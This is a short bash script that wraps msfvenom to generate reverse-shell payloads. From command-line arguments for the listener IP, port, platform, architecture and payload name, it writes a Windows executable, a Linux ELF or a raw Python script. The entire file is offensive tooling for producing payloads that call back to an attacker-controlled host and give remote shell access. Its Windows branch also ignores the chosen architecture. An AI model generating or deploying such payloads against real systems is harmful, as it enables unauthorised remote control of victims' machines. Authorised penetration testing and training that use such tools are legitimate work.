#!/bin/bash

# $1 -> IP
# $2 -> Port
# $3 -> options
# $4 -> Arch
# $5 -> Payload

ARCH="-"
if [ $4 -eq 1 ]
then
	ARCH="x64"
else
	ARCH="x86"
fi

if [ $3 -eq 1 ]
then
	# Windows
	msfvenom -p $5 LHOST=$1 LPORT=$2 --arch x86 -f exe > reverse.exe
elif [ $3 -eq 2 ]
then
	msfvenom -p $5 LHOST=$1 LPORT=$2 -f elf > reverse.elf
elif [ $3 -eq 3 ]
then
	# Script Based (Python)
	msfvenom -p $5 LHOST=$1 LPORT=$2 --arch $ARCH -f raw > reverse.py
else
	echo "[-] Fatal Error!"
fi
